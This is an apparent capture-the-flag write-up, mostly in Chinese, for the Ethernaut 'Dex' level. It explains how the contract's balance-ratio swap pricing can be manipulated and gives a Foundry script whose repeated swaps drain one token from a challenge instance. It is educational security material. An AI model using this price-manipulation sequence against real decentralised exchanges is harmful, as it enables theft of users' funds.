# Ethernaut CTF Writeup

## Level 22 Dex

> 題目: https://ethernaut.openzeppelin.com/level/0xB52C8785168b12b9333122578dcA793B7f4F2762

原始碼:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

過關條件: 

- You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.
- hack the basic DEX contract below and steal the funds by price manipulation.

解法：

- 由於 `getSwapPrice` 的計算公式依賴於代幣的餘額比例，攻擊者可藉由少量的 `token1` 及 `token2` 不斷互換，逐步消耗合約中的代幣
    - 10 token1 -> 10 token2: 第一次交換，合約池中代幣數量固定，為預設的交換比例 (1:1)
    - 20 token2 -> 24.44 token1: 由於第一次交換使合約中 token2 變少了，可換回的 token1 數量將會多於攻擊者投入的數量 (20*(110/90))
    - 透過多次重複這個過程，攻擊者可逐步消耗池中的代幣
- 展開
    - 初始狀態 (token1 token2)
        > pool:100 100

    - 10 token1 -> 10 token2
        > pool:110 90

    - 20 token2 -> 20*(110/90)=24.44 token1
        > pool:86 110

    - 24 token1 -> 24*(110/86)=30.69 token2
        > pool:110 80

    - 30 token2 -> 30*(110/80)=41.25 token1
        > pool:69 110

    - 41 token1 -> 41*(110/69)=65.36 token2
        > pool:110 45
    
    - 45 token2 -> 45*(110/45)=110 token1
        > pool 0 90

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Dex} from "../src/level22/Dex.sol";

// export RPC_URL=https://sepolia.optimism.io
// export PKEY=0xabc
// forge script script/level22.s.sol --rpc-url $RPC_URL --private-key $PKEY --tc Attack --broadcast
contract Attack is Script {
    Dex public target;
    function run() public {
        vm.startBroadcast();

        // exploit logic
        target = Dex(0x802480612B99ef37c13588EdCAA5fd9B5b479b07);
        target.approve(address(target), 500);
        address token1 = target.token1();
        address token2 = target.token2();

        target.swap(token1, token2, 10);

        target.swap(token2, token1, 20);

        target.swap(token1, token2, 24);

        target.swap(token2, token1, 30);

        target.swap(token1, token2, 41);

        target.swap(token2, token1, 45);
        
        console.log(target.balanceOf(token1, address(target)));
        console.log(target.balanceOf(token2, address(target)));
        console.log(target.balanceOf(token1, msg.sender));
        console.log(target.balanceOf(token2, msg.sender));


        vm.stopBroadcast();
    }
}
```